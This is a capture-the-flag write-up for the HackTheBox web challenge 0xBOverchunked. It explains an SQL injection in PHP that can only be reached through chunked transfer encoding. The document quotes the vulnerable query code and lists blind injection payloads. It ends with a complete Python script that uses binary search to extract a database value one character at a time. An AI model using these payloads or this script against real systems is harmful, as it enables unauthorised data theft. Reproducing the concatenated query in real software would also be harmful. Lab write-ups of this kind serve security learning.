---
title: When Leetcode Meets Hacking
description: Solution for HTB Web Challenge 0xBOverchunked
date: 2024-02-08 02:45:01-0700
image: img/hackthebox.jpg
categories:
    - HackTheBox
tags:
    - web
    - htb
    - easy
---

# Intro

Given that I'm currently grinding leetcode and app sec stuff, this challenge was super enjoyable.
The vulnerability is very straightforward and easy to spot, and you get to write a binary search script to leak the flag (you don't have to, but it does offer optimal time complexity).

# Walkthrough

There is an SQL injection available within the `unsafequery()` function.

```php
function unsafequery($pdo, $id)
{
    try
    {
        $stmt = $pdo->query("SELECT id, gamename, gamedesc, image FROM posts WHERE id = '$id'");
        $result = $stmt->fetch(PDO::FETCH_ASSOC);
        return $result;
    }
    catch(Exception $e)
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}
```

This unsafe function can only be called when we have the `Transfer-Encoding: chunked` header in our request, but if the query succeeds then we will only see an error message.

```php
if (isset($_SERVER["HTTP_TRANSFER_ENCODING"]) && $_SERVER["HTTP_TRANSFER_ENCODING"] == "chunked")
{
    $search = $_POST['search'];
    $result = unsafequery($pdo, $search);

    if ($result)
    {
        echo "<div class='results'>No post id found.</div>";
    }
    else
    {
        http_response_code(500);
        echo "Internal Server Error";
        exit();
    }
}
```
However, this is enough for blind SQL.
We can iterate over the indices of the flag value, and compare each substring of length 1 at that index with another character, and make educated guesses about the value of the flag.
Take a look at the following:

```
SELECT id, gamename, gamedesc, image from posts where id = '1' AND 1=1 ;--
SELECT id, gamename, gamedesc, image from posts where id = '1' AND substr('HTB', 1, 1) = 'H' ;--
SELECT id, gamename, gamedesc, image FROM posts WHERE id = '1' AND substr((SELECT gamedesc FROM posts WHERE id = '6'), 1, 1) > 'A' ;--
```
All of these statements will execute successfully, giving us the `No post id found` message.

It's just a slightly more convuluted basic SQL injection, but you base your guess of the flag value based on whether the second condition resolves to True or False.
This is where leetcode comes in.
So the flag can contain any value from 0x20 to 0x7f (that is just the readable ASCII range).
So we can use a binary search algorithm to make a guess as to whether a character in the flag is greater or lesser than some mid range value.
We just take the mid point of 0x20 and 0x75, create a query that will give us the `No post id found` message if the flag letter is greater, or give us a 500 error if its not.
Then we readjust the range, and keep repeating until only 1 character is left.

```python
#!/usr/bin/python3

import requests

URL = "http://localhost:1337"
PATH = "/Controllers/Handlers/SearchHandler.php"

def build_query(idx, c):
        query = f"search=6' AND substr((SELECT gamedesc FROM posts where id = '6'), {idx}, 1) > '{c}' ;--"
        payload = ""
        payload += f"{len(query):X}\r\n"
        payload += query
        payload += "\r\n"
        payload += "0\r\n"
        payload += "\r\n"

        return payload

def make_request(payload):
        headers = {
                "Content-Type": "application/x-www-form-urlencoded",
                "Transfer-Encoding": "chunked"
                }
        r = requests.post(URL + PATH, data=payload, headers=headers)
        if r.status_code == 200:
                return True
        else:
                return False

def find_letter(idx):
        start = 32
        end = 127

        while (end - start) > 0:
                mid = (start + end) // 2
                q = build_query(idx, chr(mid))
                correct = make_request(q)
                if correct:
                        start = mid + 1
                else:
                        end = mid
        
        return chr(start)

print("[i] LEAKING FLAG: ", end="")
letter = ""
ctr = 1
while letter != "}":
        letter = find_letter(ctr)
        print(letter, end="")
        ctr += 1
```
